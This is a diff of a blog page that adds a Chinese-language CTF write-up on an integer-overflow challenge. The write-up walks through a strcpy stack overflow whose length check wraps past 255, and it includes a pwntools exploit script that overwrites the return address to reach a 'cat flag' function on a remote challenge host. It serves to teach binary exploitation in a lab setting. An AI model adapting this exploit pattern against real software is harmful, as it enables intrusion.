@@ -9,7 +9,7 @@
     
     <title>
         
-            Archive |
+            int overflow |
         
         no1r&#39;s blog
     </title>
@@ -66,7 +66,7 @@
                         </li>
                     
                         <li class="menu-item">
-                            <a class="active"
+                            <a class=""
                                href="/archives"
                             >
                                 ARCHIVES
@@ -100,7 +100,7 @@
                 </li>
             
                 <li class="drawer-menu-item flex-center">
-                    <a class="active"
+                    <a class=""
                        href="/archives">ARCHIVES</a>
                 </li>
             
@@ -120,31 +120,21 @@
 
                 
                     <div class="fade-in-down-animation">
-    <div class="archive-container ">
+    <div class="page-template-container">
         
-<div class="archive-list-container">
-    
-        <section class="archive-item">
-            <div class="archive-item-header">
-                <span class="archive-year">2020</span>
-                <span class="archive-year-post-count">[1]</span>
-            </div>
-            <ul class="article-list">
-                
-                    <li class="article-item">
-                        <a class="article-title"
-                           href="/2020/06/25/tctf-secure-jit/"
-                        >TCTF2021 FINAL securejit2</a>
-                        <span class="article-date">06-25</span>
-                    </li>
-                
-            </ul>
-        </section>
-    
-</div>
-
+        
+        <div class="page-template-content markdown-body">
+            
+                <p>检查保护机制<br><img src="/images/pasted-7.png" alt="upload successful"><br>main函数没有问题<br><img src="/images/pasted-8.png" alt="upload successful"><br>login函数<br><img src="/images/pasted-9.png" alt="upload successful"><br>check_password函数<br><img src="/images/pasted-10.png" alt="upload successful"><br>可以看到check_password函数有一个strcpy函数，把输入的字符串(s)复制给dest,这就提供了溢出的可能性。<br>想要进入该函数，必须满足s的长度为4~8，而v3可表示范围是0 ~ 255，所以如果考虑溢出，v3需要在259 ~ 263范围内。<br>接着看一下dest在栈中位置，dest到函数返回值r距离0x(4-(-14))<br><img src="/images/pasted-11.png" alt="upload successful"><br>最后字符串中找到cat flag地址 <code>0x0804868B</code><br><img src="/images/pasted-12.png" alt="upload successful"><br>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="string">&quot;36329&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x14</span>+<span class="number">4</span>) + p32(<span class="number">0x0804868B</span>) + <span class="string">&#x27;a&#x27;</span> * (<span class="number">262</span>-<span class="number">0x14</span>-<span class="number">4</span>-<span class="number">4</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ce:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;me:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;12&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;wd:&quot;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()                      </span><br></pre></td></tr></table></figure>
+            
+        </div>
+        <div class="page-template-comments">
+            
+        </div>
     </div>
 </div>
+
 
                 
             </div>
